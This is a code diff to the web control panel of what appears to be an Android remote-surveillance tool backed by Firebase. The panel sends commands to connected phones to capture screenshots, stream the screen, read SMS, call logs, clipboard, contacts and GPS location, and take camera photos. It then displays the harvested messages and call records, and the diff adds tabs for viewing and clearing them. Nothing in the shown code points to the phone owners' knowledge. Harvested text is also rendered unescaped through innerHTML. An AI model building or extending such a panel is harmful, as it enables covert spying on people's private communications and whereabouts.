@@ -56,10 +56,7 @@
             margin-bottom: 5px;
         }
 
-        .header p {
-            color: var(--gray);
-            font-size: 1.1em;
-        }
+        .header p { color: var(--gray); font-size: 1.1em; }
 
         .stats-bar {
             display: flex;
@@ -80,12 +77,7 @@
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
 
-        .stat-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-        }
-
+        .stat-dot { width: 10px; height: 10px; border-radius: 50%; }
         .stat-dot.online { background: var(--success); animation: pulse 2s infinite; }
         .stat-dot.connected { background: var(--info); }
         .stat-dot.commands { background: var(--warning); }
@@ -108,22 +100,42 @@
             border-radius: var(--radius);
             padding: 25px;
             cursor: pointer;
-            border: 2px solid transparent;
+            border: 3px solid transparent;
             transition: all 0.3s ease;
             box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            position: relative;
         }
 
-        .device-card:hover { 
-            transform: translateY(-5px); 
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15); 
+        .device-card:hover { transform: translateY(-5px); box-shadow: 0 20px 60px rgba(0,0,0,0.15); }
+        .device-card.selected { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1); }
+        .device-card.connected-to-me { border-color: var(--success); box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.1); }
+        .device-card.in-use { border-color: #f59e0b; opacity: 0.9; cursor: not-allowed; }
+        .device-card.offline { opacity: 0.7; }
+
+        .device-card.in-use::after {
+            content: '🔒 IN USE';
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #fef3c7;
+            color: #92400e;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.7em;
+            font-weight: 700;
         }
-        .device-card.selected { 
-            border-color: var(--primary); 
-            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
-        }
-        .device-card.connected-to-me { 
-            border-color: var(--success); 
-            box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.1);
+
+        .device-card.offline::after {
+            content: 'OFFLINE';
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #fee2e2;
+            color: #991b1b;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.7em;
+            font-weight: 700;
         }
 
         .device-icon {
@@ -138,16 +150,8 @@
             color: white;
         }
 
-        .device-name { 
-            font-size: 1.2em; 
-            font-weight: 700; 
-            margin-bottom: 5px; 
-            color: var(--dark);
-        }
-        .device-model { 
-            color: var(--gray); 
-            font-size: 0.85em; 
-        }
+        .device-name { font-size: 1.2em; font-weight: 700; margin-bottom: 5px; color: var(--dark); }
+        .device-model { color: var(--gray); font-size: 0.85em; }
 
         .badge {
             padding: 5px 12px;
@@ -174,25 +178,13 @@
             font-size: 0.9em;
         }
 
-        .btn:hover { 
-            transform: translateY(-2px); 
-            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
-        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,0,0,0.15); }
         .btn:active { transform: translateY(0); }
-
-        .btn-connect { 
-            background: linear-gradient(135deg, var(--primary), var(--secondary)); 
-            color: white; 
-        }
-        .btn-disconnect { 
-            background: var(--danger); 
-            color: white; 
-        }
-        .btn-disabled {
-            background: #d1d5db;
-            color: #6b7280;
-            cursor: not-allowed;
-        }
+        .btn-connect { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; }
+        .btn-disconnect { background: var(--danger); color: white; }
+        .btn-disabled { background: #d1d5db; color: #6b7280; cursor: not-allowed; }
+        .btn-delete { background: #fee2e2; color: #991b1b; border: 1px solid #fecaca; }
+        .btn-delete:hover { background: var(--danger); color: white; }
 
         .control-panel {
             background: rgba(255, 255, 255, 0.95);
@@ -211,20 +203,21 @@
 
         .command-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 12px;
+            margin: 15px 0;
         }
 
         .command-card {
             background: var(--light);
-            padding: 20px;
+            padding: 18px;
             border-radius: 12px;
             text-align: center;
             cursor: pointer;
             border: 2px solid transparent;
             transition: all 0.3s ease;
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            position: relative;
         }
 
         .command-card:hover {
@@ -234,19 +227,12 @@
             box-shadow: 0 8px 25px rgba(0,0,0,0.1);
         }
 
-        .command-card:active {
-            transform: translateY(0);
-        }
+        .command-card:active { transform: scale(0.95); }
+        .command-card.no-device { cursor: not-allowed; opacity: 0.6; }
+        .command-card.no-device:hover { transform: none; border-color: transparent; }
 
-        .command-icon { 
-            font-size: 2em; 
-            margin-bottom: 10px; 
-        }
-        .command-label { 
-            font-weight: 600; 
-            font-size: 0.9em; 
-            color: var(--dark);
-        }
+        .command-icon { font-size: 2em; margin-bottom: 8px; }
+        .command-label { font-weight: 600; font-size: 0.85em; color: var(--dark); }
 
         .section-title {
             font-size: 1.1em;
@@ -254,6 +240,14 @@
             margin: 25px 0 15px;
             padding-bottom: 10px;
             border-bottom: 2px solid #e5e7eb;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .section-title-left {
             display: flex;
             align-items: center;
             gap: 10px;
@@ -267,7 +261,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 20px 0;
+            margin: 15px 0;
             position: relative;
             overflow: hidden;
         }
@@ -278,16 +272,118 @@
             border-radius: 8px;
         }
 
-        .screen-placeholder {
-            text-align: center;
-            color: #999;
+        .screen-info {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .screen-placeholder i {
-            font-size: 4em;
-            display: block;
-            margin-bottom: 15px;
+        .screen-delete-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(239, 68, 68, 0.9);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.85em;
+            z-index: 10;
+            font-weight: 600;
         }
+
+        .screen-delete-btn:hover {
+            background: rgba(220, 38, 38, 1);
+        }
+
+        .data-table-container {
+            background: var(--light);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            max-height: 400px;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9em;
+        }
+
+        .data-table th {
+            background: var(--dark);
+            color: white;
+            padding: 12px 15px;
+            text-align: left;
+            position: sticky;
+            top: 0;
+            z-index: 5;
+        }
+
+        .data-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .data-table tr:hover td { background: rgba(102, 126, 234, 0.05); }
+
+        .call-type {
+            padding: 3px 10px;
+            border-radius: 15px;
+            font-size: 0.8em;
+            font-weight: 600;
+        }
+
+        .call-incoming { background: #d1fae5; color: #065f46; }
+        .call-outgoing { background: #dbeafe; color: #1e40af; }
+        .call-missed { background: #fee2e2; color: #991b1b; }
+        .call-rejected { background: #fef3c7; color: #92400e; }
+        .call-blocked { background: #f3f4f6; color: #374151; }
+        .call-voicemail { background: #ede9fe; color: #5b21b6; }
+
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: var(--gray);
+        }
+
+        .no-data i { font-size: 3em; display: block; margin-bottom: 15px; }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            padding: 10px 20px;
+            border: 2px solid #e5e7eb;
+            background: white;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-size: 0.9em;
+        }
+
+        .tab-btn:hover { border-color: var(--primary); }
+        .tab-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
 
         .log-container {
             background: var(--dark);
@@ -300,26 +396,7 @@
             font-size: 0.85em;
         }
 
-        .log-container::-webkit-scrollbar {
-            width: 6px;
-        }
-
-        .log-container::-webkit-scrollbar-track {
-            background: #374151;
-            border-radius: 3px;
-        }
-
-        .log-container::-webkit-scrollbar-thumb {
-            background: #6b7280;
-            border-radius: 3px;
-        }
-
-        .log-entry {
-            margin: 3px 0;
-            padding: 3px 0;
-            border-bottom: 1px solid rgba(55, 65, 81, 0.5);
-        }
-
+        .log-entry { margin: 3px 0; padding: 3px 0; border-bottom: 1px solid rgba(55, 65, 81, 0.5); }
         .log-time { color: #6b7280; }
         .log-success { color: #10b981; }
         .log-error { color: #ef4444; }
@@ -345,18 +422,14 @@
             align-items: center;
             gap: 10px;
             animation: slideIn 0.3s ease;
-            min-width: 250px;
         }
 
-        .toast.fade-out {
-            animation: slideOut 0.3s ease forwards;
-        }
+        .toast.fade-out { animation: slideOut 0.3s ease forwards; }
 
         @keyframes slideIn {
             from { transform: translateX(100%); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
         }
-
         @keyframes slideOut {
             from { transform: translateX(0); opacity: 1; }
             to { transform: translateX(100%); opacity: 0; }
@@ -381,14 +454,8 @@
             justify-content: center;
         }
 
-        .fab:hover {
-            transform: scale(1.1);
-            box-shadow: 0 15px 50px rgba(0,0,0,0.3);
-        }
-
-        .fab i {
-            color: var(--primary);
-        }
+        .fab:hover { transform: scale(1.1); }
+        .fab i { color: var(--primary); }
 
         .panel-header {
             display: flex;
@@ -399,44 +466,88 @@
             gap: 15px;
         }
 
-        .panel-header h2 {
-            color: var(--dark);
+        .sms-item {
+            background: white;
+            padding: 12px 15px;
+            border-radius: 10px;
+            margin: 8px 0;
+            border-left: 4px solid var(--primary);
+            position: relative;
         }
 
-        .panel-header p {
-            color: var(--gray);
-            font-size: 0.9em;
-        }
+        .sms-address { font-weight: 700; color: var(--dark); margin-bottom: 5px; }
+        .sms-body { color: var(--gray); font-size: 0.9em; }
+        .sms-date { font-size: 0.75em; color: #9ca3af; margin-top: 5px; }
 
-        .clear-btn {
-            background: transparent;
-            border: 1px solid #d1d5db;
-            padding: 5px 15px;
+        .delete-all-btn {
+            background: var(--danger);
+            color: white;
+            border: none;
+            padding: 8px 18px;
             border-radius: 20px;
             cursor: pointer;
-            color: var(--gray);
-            transition: all 0.3s ease;
+            font-weight: 600;
             font-size: 0.85em;
+            transition: all 0.3s ease;
         }
 
-        .clear-btn:hover {
-            background: #fee2e2;
-            border-color: var(--danger);
-            color: var(--danger);
+        .delete-all-btn:hover {
+            background: #dc2626;
+            transform: scale(1.05);
         }
+
+        .connected-badge {
+            background: linear-gradient(135deg, var(--success), #059669);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-weight: 600;
+            font-size: 0.9em;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            animation: pulse 2s infinite;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: var(--radius);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .modal h3 { margin-bottom: 15px; color: var(--dark); }
+        .modal p { color: var(--gray); margin-bottom: 20px; }
+        .modal .btn { margin: 5px; }
 
         @media (max-width: 768px) {
             body { padding: 10px; }
             .header h1 { font-size: 1.8em; }
             .device-grid { grid-template-columns: 1fr; }
-            .command-grid { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
-            .stats-bar { gap: 15px; }
-            .panel-header { flex-direction: column; align-items: flex-start; }
+            .command-grid { grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); }
+            .data-table { font-size: 0.8em; }
         }
     </style>
 </head>
 <body>
     <div class="toast-container" id="toastContainer"></div>
+    <div class="modal-overlay" id="modalOverlay" style="display: none;"></div>
 
     <div class="container">
         <!-- Header -->
@@ -472,97 +583,158 @@
             <div class="panel-header">
                 <div>
                     <h2 id="connectedDeviceName">No device connected</h2>
-                    <p id="connectedDeviceId">Select a device to begin</p>
+                    <p id="connectedDeviceId" style="color: var(--gray);">Select a device to begin</p>
                 </div>
-                <button class="btn btn-disconnect" onclick="disconnectDevice()">
-                    <i class="fas fa-unlink"></i> Disconnect
+                <div style="display: flex; align-items: center; gap: 15px;">
+                    <span class="connected-badge" id="connectedBadge">
+                        <i class="fas fa-link"></i> Connected
+                    </span>
+                    <button class="btn btn-disconnect" onclick="showDisconnectConfirm()">
+                        <i class="fas fa-unlink"></i> Disconnect
+                    </button>
+                </div>
+            </div>
+
+            <!-- Tabs -->
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchTab('screen')">📺 Live Screen</button>
+                <button class="tab-btn" onclick="switchTab('sms')">💬 SMS</button>
+                <button class="tab-btn" onclick="switchTab('calls')">📞 Call Log</button>
+                <button class="tab-btn" onclick="switchTab('commands')">🎮 Commands</button>
+            </div>
+
+            <!-- Screen Tab -->
+            <div class="tab-content active" id="tab-screen">
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>📸</span> Screenshot & Stream
+                    </div>
+                    <button class="delete-all-btn" onclick="clearScreen()">
+                        <i class="fas fa-trash"></i> Clear Screen
+                    </button>
+                </div>
+                <div class="command-grid">
+                    <div class="command-card" onclick="sendCommand('screenshot')" id="cmd-screenshot">
+                        <div class="command-icon">📸</div>
+                        <div class="command-label">Take Screenshot</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('start_streaming')" id="cmd-stream">
+                        <div class="command-icon">📹</div>
+                        <div class="command-label">Start Stream</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('stop_streaming')" id="cmd-stopstream">
+                        <div class="command-icon">⏹️</div>
+                        <div class="command-label">Stop Stream</div>
+                    </div>
+                </div>
+                <div class="screen-container" id="screenContainer">
+                    <div class="no-data">
+                        <i class="fas fa-mobile-alt"></i>
+                        <p>Click "Take Screenshot" or "Start Stream"</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SMS Tab -->
+            <div class="tab-content" id="tab-sms">
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>💬</span> SMS Messages
+                    </div>
+                    <button class="delete-all-btn" onclick="clearSMS()">
+                        <i class="fas fa-trash"></i> Clear All SMS
+                    </button>
+                </div>
+                <div id="smsContainer">
+                    <div class="no-data">
+                        <i class="fas fa-envelope"></i>
+                        <p>Click SMS button in Commands tab</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Call Log Tab -->
+            <div class="tab-content" id="tab-calls">
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>📞</span> Call Log
+                    </div>
+                    <button class="delete-all-btn" onclick="clearCallLog()">
+                        <i class="fas fa-trash"></i> Clear All Calls
+                    </button>
+                </div>
+                <div id="callLogContainer">
+                    <div class="no-data">
+                        <i class="fas fa-phone"></i>
+                        <p>Click Call Log button in Commands tab</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Commands Tab -->
+            <div class="tab-content" id="tab-commands">
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>🎮</span> Device Commands
+                    </div>
+                </div>
+                <div class="command-grid">
+                    <div class="command-card" onclick="sendCommand('screenshot')">
+                        <div class="command-icon">📸</div>
+                        <div class="command-label">Screenshot</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('start_streaming')">
+                        <div class="command-icon">📹</div>
+                        <div class="command-label">Start Stream</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('stop_streaming')">
+                        <div class="command-icon">⏹️</div>
+                        <div class="command-label">Stop Stream</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('get_clipboard')">
+                        <div class="command-icon">📋</div>
+                        <div class="command-label">Clipboard</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('get_sms')">
+                        <div class="command-icon">💬</div>
+                        <div class="command-label">Get SMS</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('call_log')">
+                        <div class="command-icon">📞</div>
+                        <div class="command-label">Call Log</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('get_location')">
+                        <div class="command-icon">📍</div>
+                        <div class="command-label">GPS Location</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('get_contacts')">
+                        <div class="command-icon">👥</div>
+                        <div class="command-label">Contacts</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('get_device_info')">
+                        <div class="command-icon">ℹ️</div>
+                        <div class="command-label">Device Info</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('toggle_flashlight')">
+                        <div class="command-icon">🔦</div>
+                        <div class="command-label">Flashlight</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('take_photo')">
+                        <div class="command-icon">📷</div>
+                        <div class="command-label">Take Photo</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Activity Log -->
+            <div class="section-title">
+                <div class="section-title-left">
+                    <span>📝</span> Activity Log
+                </div>
+                <button class="delete-all-btn" onclick="clearLogs()">
+                    <i class="fas fa-trash"></i> Clear Logs
                 </button>
             </div>
-
-            <div class="section-title">
-                <span>📸</span> Screenshot & Stream
-            </div>
-            <div class="command-grid">
-                <div class="command-card" onclick="sendCommand('screenshot')">
-                    <div class="command-icon">📸</div>
-                    <div class="command-label">Screenshot</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('start_streaming')">
-                    <div class="command-icon">📹</div>
-                    <div class="command-label">Start Stream</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('stop_streaming')">
-                    <div class="command-icon">⏹️</div>
-                    <div class="command-label">Stop Stream</div>
-                </div>
-            </div>
-
-            <div class="section-title">
-                <span>🔧</span> Device Controls
-            </div>
-            <div class="command-grid">
-                <div class="command-card" onclick="sendCommand('get_clipboard')">
-                    <div class="command-icon">📋</div>
-                    <div class="command-label">Clipboard</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('list_apps')">
-                    <div class="command-icon">📦</div>
-                    <div class="command-label">Apps</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('get_notifications')">
-                    <div class="command-icon">🔔</div>
-                    <div class="command-label">Notifications</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('call_log')">
-                    <div class="command-icon">📞</div>
-                    <div class="command-label">Call Log</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('get_sms')">
-                    <div class="command-icon">💬</div>
-                    <div class="command-label">SMS</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('get_location')">
-                    <div class="command-icon">📍</div>
-                    <div class="command-label">GPS Location</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('get_contacts')">
-                    <div class="command-icon">👥</div>
-                    <div class="command-label">Contacts</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('get_device_info')">
-                    <div class="command-icon">ℹ️</div>
-                    <div class="command-label">Device Info</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('toggle_flashlight')">
-                    <div class="command-icon">🔦</div>
-                    <div class="command-label">Flashlight</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('record_audio')">
-                    <div class="command-icon">🎤</div>
-                    <div class="command-label">Record Audio</div>
-                </div>
-                <div class="command-card" onclick="sendCommand('take_photo')">
-                    <div class="command-icon">📷</div>
-                    <div class="command-label">Take Photo</div>
-                </div>
-            </div>
-
-            <div class="section-title">
-                <span>📺</span> Live Screen
-            </div>
-            <div class="screen-container" id="screenContainer">
-                <div class="screen-placeholder">
-                    <i class="fas fa-mobile-alt"></i>
-                    <p>Click "Start Stream" to begin</p>
-                </div>
-            </div>
-
-            <div class="section-title">
-                <span>📝</span> Activity Log
-            </div>
-            <button class="clear-btn" onclick="clearLogs()">
-                <i class="fas fa-trash"></i> Clear Logs
-            </button>
             <div class="log-container" id="logContainer">
                 <div class="log-entry">
                     <span class="log-time">[00:00:00]</span>
@@ -572,7 +744,6 @@
         </div>
     </div>
 
-    <!-- Refresh Button -->
     <button class="fab" onclick="refreshDevices()" title="Refresh Devices">
         <i class="fas fa-sync-alt"></i>
     </button>
@@ -589,63 +760,85 @@
             appId: "1:176316652077:android:f2f9ef00fe36fedd40f6a4"
         };
 
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Global State
         let devices = {};
         let connectedDeviceId = null;
         let myClientId = 'web_' + Math.random().toString(36).substr(2, 9);
         let commandCount = 0;
         let streamListener = null;
         let responseListener = null;
+        let screenshotListener = null;
 
-        // DOM Elements
         const deviceGrid = document.getElementById('deviceGrid');
         const controlPanel = document.getElementById('controlPanel');
         const connectedDeviceName = document.getElementById('connectedDeviceName');
         const connectedDeviceIdEl = document.getElementById('connectedDeviceId');
         const logContainer = document.getElementById('logContainer');
         const screenContainer = document.getElementById('screenContainer');
+        const smsContainer = document.getElementById('smsContainer');
+        const callLogContainer = document.getElementById('callLogContainer');
         const onlineCount = document.getElementById('onlineCount');
         const connectedCount = document.getElementById('connectedCount');
         const commandCountEl = document.getElementById('commandCount');
 
-        // Toast Notification System
+        // ============ MODAL ============
+        function showModal(title, message, onConfirm) {
+            const overlay = document.getElementById('modalOverlay');
+            overlay.innerHTML = `
+                <div class="modal">
+                    <h3>${title}</h3>
+                    <p>${message}</p>
+                    <button class="btn btn-disconnect" onclick="document.getElementById('modalOverlay').style.display='none'; arguments[0]?.stopPropagation?.()">Cancel</button>
+                    <button class="btn btn-connect" id="modalConfirmBtn">Confirm</button>
+                </div>
+            `;
+            overlay.style.display = 'flex';
+            document.getElementById('modalConfirmBtn').addEventListener('click', () => {
+                overlay.style.display = 'none';
+                if (onConfirm) onConfirm();
+            });
+        }
+
+        function showDisconnectConfirm() {
+            showModal('Disconnect Device', 'Are you sure you want to disconnect?', disconnectDevice);
+        }
+
+        // ============ TAB SWITCHING ============
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            const tabBtn = document.querySelector(`[onclick="switchTab('${tabName}')"]`);
+            if (tabBtn) tabBtn.classList.add('active');
+            
+            const tabContent = document.getElementById(`tab-${tabName}`);
+            if (tabContent) tabContent.classList.add('active');
+        }
+
+        // ============ TOAST ============
         function showToast(message, type = 'info') {
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
             toast.className = 'toast';
-            
-            const icons = {
-                success: '✅',
-                error: '❌',
-                warning: '⚠️',
-                info: 'ℹ️'
-            };
-            
+            const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
             toast.innerHTML = `<span>${icons[type] || icons.info}</span> ${message}`;
             container.appendChild(toast);
-            
             setTimeout(() => {
                 toast.classList.add('fade-out');
                 setTimeout(() => toast.remove(), 300);
             }, 3000);
         }
 
-        // Logging System
+        // ============ LOG ============
         function addLog(message, type = 'info') {
             const time = new Date().toLocaleTimeString();
             const logEntry = document.createElement('div');
             logEntry.className = 'log-entry';
             logEntry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">${message}</span>`;
             logContainer.insertBefore(logEntry, logContainer.firstChild);
-            
-            // Keep only last 100 entries
-            while (logContainer.children.length > 100) {
-                logContainer.removeChild(logContainer.lastChild);
-            }
+            while (logContainer.children.length > 100) logContainer.removeChild(logContainer.lastChild);
         }
 
         function clearLogs() {
@@ -653,7 +846,35 @@
             addLog('Logs cleared', 'info');
         }
 
-        // Stats Update
+        // ============ CLEAR FUNCTIONS ============
+        function clearScreen() {
+            showModal('Clear Screen', 'Delete current screenshot/stream?', () => {
+                screenContainer.innerHTML = '<div class="no-data"><i class="fas fa-mobile-alt"></i><p>Screen cleared</p></div>';
+                if (connectedDeviceId) {
+                    database.ref(`devices/${connectedDeviceId}/screenshots`).remove();
+                }
+                addLog('🧹 Screen cleared', 'info');
+                showToast('Screen cleared', 'success');
+            });
+        }
+
+        function clearSMS() {
+            showModal('Clear SMS', 'Delete all SMS data?', () => {
+                smsContainer.innerHTML = '<div class="no-data"><i class="fas fa-envelope"></i><p>SMS data cleared</p></div>';
+                addLog('🧹 SMS cleared', 'info');
+                showToast('SMS cleared', 'success');
+            });
+        }
+
+        function clearCallLog() {
+            showModal('Clear Call Log', 'Delete all call log data?', () => {
+                callLogContainer.innerHTML = '<div class="no-data"><i class="fas fa-phone"></i><p>Call log cleared</p></div>';
+                addLog('🧹 Call log cleared', 'info');
+                showToast('Call log cleared', 'success');
+            });
+        }
+
+        // ============ STATS ============
         function updateStats() {
             const deviceList = Object.values(devices).filter(d => d && d.deviceName);
             onlineCount.textContent = deviceList.filter(d => d.status === 'online').length;
@@ -661,22 +882,106 @@
             commandCountEl.textContent = commandCount;
         }
 
-        // Firebase Listeners Setup
+        // ============ FORMATTING ============
+        function formatDate(timestamp) {
+            return new Date(parseInt(timestamp)).toLocaleString();
+        }
+
+        function formatDuration(seconds) {
+            const sec = parseInt(seconds);
+            if (!sec || sec === 0) return '0s';
+            if (sec < 60) return `${sec}s`;
+            const mins = Math.floor(sec / 60);
+            const remainingSecs = sec % 60;
+            return `${mins}m ${remainingSecs}s`;
+        }
+
+        // ============ DISPLAY FUNCTIONS ============
+        function displayCallLog(calls, deviceName) {
+            if (!calls || calls.length === 0) {
+                callLogContainer.innerHTML = '<div class="no-data"><i class="fas fa-phone-slash"></i><p>No calls found</p></div>';
+                return;
+            }
+
+            let html = `<div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-weight: 700; color: var(--primary);">📱 ${deviceName} - ${calls.length} calls</span>
+                <button class="btn btn-delete" onclick="clearCallLog()"><i class="fas fa-trash"></i> Clear</button>
+            </div>`;
+            html += '<div class="data-table-container"><table class="data-table"><thead><tr>';
+            html += '<th>#</th><th>Name</th><th>Number</th><th>Type</th><th>Duration</th><th>Date</th>';
+            html += '</tr></thead><tbody>';
+
+            calls.forEach((call, index) => {
+                const typeClass = call.type.toLowerCase();
+                html += `<tr>
+                    <td>${index + 1}</td>
+                    <td><strong>${call.name || 'Unknown'}</strong></td>
+                    <td>${call.number}</td>
+                    <td><span class="call-type call-${typeClass}">${call.type}</span></td>
+                    <td>${formatDuration(call.duration)}</td>
+                    <td>${formatDate(call.date)}</td>
+                </tr>`;
+            });
+
+            html += '</tbody></table></div>';
+            callLogContainer.innerHTML = html;
+            switchTab('calls');
+            addLog(`📞 Call Log displayed: ${calls.length} calls from ${deviceName}`, 'success');
+            showToast(`Call log loaded: ${calls.length} calls`, 'success');
+        }
+
+        function displaySMS(messages, deviceName) {
+            if (!messages || messages.length === 0) {
+                smsContainer.innerHTML = '<div class="no-data"><i class="fas fa-envelope-open"></i><p>No SMS found</p></div>';
+                return;
+            }
+
+            let html = `<div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-weight: 700; color: var(--primary);">📱 ${deviceName} - ${messages.length} messages</span>
+                <button class="btn btn-delete" onclick="clearSMS()"><i class="fas fa-trash"></i> Clear</button>
+            </div>`;
+
+            messages.forEach(msg => {
+                html += `
+                <div class="sms-item">
+                    <div class="sms-address">📱 ${msg.address}</div>
+                    <div class="sms-body">${msg.body}</div>
+                    <div class="sms-date">📅 ${formatDate(msg.date)}</div>
+                </div>`;
+            });
+
+            smsContainer.innerHTML = html;
+            switchTab('sms');
+            addLog(`💬 SMS displayed: ${messages.length} messages from ${deviceName}`, 'success');
+            showToast(`SMS loaded: ${messages.length} messages`, 'success');
+        }
+
+        function displayScreenshot(imageUrl, deviceName, width, height) {
+            screenContainer.innerHTML = `
+                <div class="screen-info">📱 ${deviceName} | ${width}x${height} | ${new Date().toLocaleTimeString()}</div>
+                <button class="screen-delete-btn" onclick="clearScreen()">
+                    <i class="fas fa-times"></i> Delete
+                </button>
+                <img src="${imageUrl}" style="max-width: 100%; max-height: 600px; border-radius: 8px;" alt="Screenshot from ${deviceName}">
+            `;
+            switchTab('screen');
+            addLog(`📸 Screenshot from ${deviceName} (${width}x${height})`, 'success');
+            showToast(`Screenshot received from ${deviceName}`, 'success');
+        }
+
+        // ============ LISTENERS ============
         function setupListeners() {
-            // Listen for all devices
             database.ref('devices').on('value', (snapshot) => {
                 devices = snapshot.val() || {};
                 renderDevices();
                 updateStats();
             });
 
-            // Listen for device changes
             database.ref('devices').on('child_changed', (snapshot) => {
                 const deviceId = snapshot.key;
                 const device = snapshot.val();
                 if (!device) return;
 
-                // Check if this device connected to us
                 if (device.connectionStatus === 'connected' && device.connectedTo === myClientId) {
                     if (connectedDeviceId !== deviceId) {
                         connectedDeviceId = deviceId;
@@ -687,20 +992,17 @@
                         showToast(`Connected to ${device.deviceName}`, 'success');
                         setupResponseListener(deviceId);
                         setupStreamListener(deviceId);
+                        setupScreenshotListener(deviceId);
                     }
-                } 
-                // Check if this device disconnected from us
-                else if (device.connectionStatus === 'available' && connectedDeviceId === deviceId) {
+                } else if (device.connectionStatus === 'available' && connectedDeviceId === deviceId) {
                     handleDisconnection(device);
                 }
 
-                // Update local cache
                 devices[deviceId] = device;
                 renderDevices();
                 updateStats();
             });
 
-            // Listen for device removal
             database.ref('devices').on('child_removed', (snapshot) => {
                 const deviceId = snapshot.key;
                 if (connectedDeviceId === deviceId) {
@@ -717,7 +1019,6 @@
             addLog(`🔌 Disconnected from ${deviceName}`, 'warning');
             showToast(`Disconnected from ${deviceName}`, 'warning');
 
-            // Clean up listeners
             if (streamListener) {
                 database.ref(`devices/${connectedDeviceId}/screenStream`).off('value', streamListener);
                 streamListener = null;
@@ -726,18 +1027,37 @@
